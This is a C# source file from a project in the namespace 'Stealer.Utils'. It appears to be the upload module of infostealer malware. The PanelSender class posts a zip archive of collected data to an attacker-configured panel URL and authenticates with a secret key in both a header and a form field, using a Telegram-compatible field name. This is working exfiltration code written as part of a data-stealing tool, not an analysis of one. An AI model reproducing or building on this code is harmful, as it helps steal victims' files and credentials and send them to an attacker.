using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace Stealer.Utils
{
    public static class PanelSender
    {
        public static async Task<bool> SendZipAsync(byte[] zipData, string fileName)
        {
            Config.Initialize();

            if (zipData == null || zipData.Length == 0)
                return false;

            if (string.IsNullOrEmpty(Config.PanelUrl))
                return false;

            try
            {
                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromMinutes(5);

                    // Add authorization key header if configured
                    if (!string.IsNullOrEmpty(Config.SecretKey))
                    {
                        client.DefaultRequestHeaders.Add("x-panel-key", Config.SecretKey);
                    }

                    var content = new MultipartFormDataContent();
                    
                    var fileContent = new ByteArrayContent(zipData);
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
                    
                    // The backend expects "document" field name for compatibility with Telegram
                    content.Add(fileContent, "document", fileName);

                    // Add secret key to body as fallback
                    if (!string.IsNullOrEmpty(Config.SecretKey))
                    {
                        content.Add(new StringContent(Config.SecretKey), "secret_key");
                    }

                    var response = await client.PostAsync(Config.PanelUrl, content);

                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
